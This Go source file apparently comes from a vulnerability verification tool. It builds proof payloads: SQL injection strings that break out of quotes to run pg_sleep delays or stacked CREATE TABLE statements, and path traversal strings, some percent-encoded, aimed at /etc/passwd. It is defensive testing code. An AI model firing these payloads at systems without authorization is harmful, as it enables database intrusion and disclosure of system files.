package verify

import (
	"strconv"
	"strings"
	"time"
)

// creep's payloads. They prove a flaw and nothing more: a delay, an empty
// table in the run's throwaway database, a read of a world-readable file.
// None deletes, changes or reads application data.

// sqlSleepSeconds is how long the delay payload sleeps, and delayMargin
// how much longer than the baseline the payload request must take to
// count.
const (
	sqlSleepSeconds = 3
	delayMargin     = 2500 * time.Millisecond
)

// passwdMarker is what any /etc/passwd holds: root's entry.
const passwdMarker = "root:x:0:0:" //nolint:gosec // G101: the start of root's passwd line, not a credential

// baselineFile is the harmless value of a path_payload's baseline request.
const baselineFile = "creep-baseline.txt"

// sqlBaseline is the harmless value for each SQL context.
var sqlBaseline = map[string]string{"string": "creep", "numeric": "1"}

// sqlPayload is creep's SQL for a context and technique. The string forms
// close the quote and reopen it, so the statement stays valid; marker
// creates an empty table named after the nonce, which only a stacked
// statement can do.
func sqlPayload(context, technique, table string) string {
	sleep := "pg_sleep(" + strconv.Itoa(sqlSleepSeconds) + ")"
	switch {
	case context == "string" && technique == "delay":
		return "creep'||(SELECT '' FROM " + sleep + ")||'"
	case context == "numeric" && technique == "delay":
		return "(SELECT 1 FROM " + sleep + ")"
	case context == "string":
		return "creep'; CREATE TABLE " + table + " (); --"
	}
	return "1; CREATE TABLE " + table + " (); --"
}

func sqlValue(s string) value { return value{wire: urlEncode(s), text: s} }

// pathPayload is the path to /etc/passwd in a style: ../ steps, the same
// with every slash percent-encoded, or absolute. Each is already in wire
// form, so it goes into a path, a form or a JSON string as it is.
func pathPayload(style string, depth int) value {
	var p string
	switch style {
	case "relative":
		p = strings.Repeat("../", depth) + "etc/passwd"
	case "encoded":
		p = strings.Repeat("..%2f", depth) + "etc%2fpasswd"
	default:
		p = "/etc/passwd"
	}
	return value{wire: p, text: p}
}
